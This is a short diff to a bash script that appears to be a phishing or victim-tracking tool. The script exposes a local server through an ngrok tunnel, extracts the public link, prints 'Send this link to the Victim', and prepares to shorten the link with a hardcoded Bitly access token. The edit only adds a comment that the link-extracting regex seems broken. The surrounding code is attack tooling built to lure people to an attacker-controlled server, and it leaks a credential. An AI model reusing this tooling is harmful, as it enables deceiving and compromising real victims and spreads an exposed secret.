@@ -404,8 +404,8 @@ sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
 sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+# The following regex doesn't seem to work. At least, it's not grabbing a link for some reason.
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io") 
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
 api=https://api-ssl.bitly.com/v4/shorten
